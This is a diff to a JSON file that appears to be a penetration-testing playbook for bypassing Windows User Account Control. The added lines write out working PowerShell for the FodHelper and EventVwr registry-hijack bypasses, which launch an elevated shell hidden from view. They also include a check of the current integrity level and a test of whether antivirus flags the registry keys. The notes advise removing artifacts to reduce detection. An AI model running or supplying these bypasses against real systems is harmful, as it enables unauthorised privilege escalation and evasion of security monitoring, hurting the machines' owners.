@@ -60,23 +60,43 @@
           "title": "Phase 1: Detection & Validation",
           "notes": "Always check current integrity level before attempting bypass. Prevents wasted time if already elevated. Also confirms UAC is actually enabled (bypass unnecessary if disabled).",
           "commands": [
-            "check-integrity-level"
+            {
+              "id": "check-integrity-level",
+              "example": "whoami /groups | findstr /i \"Mandatory Label\"",
+              "shows": "Low: Mandatory Label\\Low Mandatory Level\nMedium: Mandator..."
+            }
           ]
         },
         {
           "title": "Phase 2: Bypass Execution",
-          "notes": "Try FodHelper first (fastest, Windows 10 only). If fails or older OS, use EventVwr (broader compatibility). Both require user in local Administrators group—if not admin, use different privesc method.",
+          "notes": "Try FodHelper first (fastest, Windows 10 only). If fails or older OS, use EventVwr (broader compatibility). Both require user in local Administrators group\u2014if not admin, use different privesc method.",
           "commands": [
-            "fodhelper-uac-bypass",
-            "eventvwr-uac-bypass"
+            {
+              "id": "fodhelper-uac-bypass",
+              "example": "# Create registry structure\nNew-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value \"cmd /c start powershell.exe\" -Force\n\n# Trigger UAC bypass\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden\n\n# Cleanup\nStart-Sleep -Seconds 3\nRemove-Item \"HKCU:\\Software\\Classes\\ms-settings\\\" -Recurse -Force",
+              "shows": "Payload executes with high integrity (admin) without UAC ..."
+            },
+            {
+              "id": "eventvwr-uac-bypass",
+              "example": "# Create registry key\nNew-Item \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"cmd /c start powershell.exe\" -Force\n\n# Trigger UAC bypass\nStart-Process \"C:\\Windows\\System32\\eventvwr.exe\" -WindowStyle Hidden\n\n# Cleanup\nStart-Sleep -Seconds 3\nRemove-Item \"HKCU:\\Software\\Classes\\mscfile\\\" -Recurse -Force",
+              "shows": "EventVwr opens, payload executes with high integrity. Eve..."
+            }
           ]
         },
         {
           "title": "Phase 3: Post-Exploitation & Cleanup",
           "notes": "After obtaining high integrity shell, complete privileged tasks immediately. Then clean up registry artifacts to reduce detection. Remember: high integrity session persists even after cleanup.",
           "commands": [
-            "check-integrity-level",
-            "uac-bypass-detection"
+            {
+              "id": "check-integrity-level",
+              "example": "whoami /groups | findstr /i \"Mandatory Label\"",
+              "shows": "Low: Mandatory Label\\Low Mandatory Level\nMedium: Mandator..."
+            },
+            {
+              "id": "uac-bypass-detection",
+              "example": "# Test registry creation (no trigger)\nNew-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value \"cmd /c echo test\" -Force\n\nWrite-Host \"Registry keys created. Check for AV alerts...\"\nStart-Sleep 10\n\n# Cleanup\nRemove-Item \"HKCU:\\Software\\Classes\\ms-settings\\\" -Recurse -Force\nWrite-Host \"Cleaned up. No AV alert = bypass likely undetected.\"",
+              "shows": "No AV alert = Bypass likely undetected. AV alert = Need a..."
+            }
           ]
         }
       ],
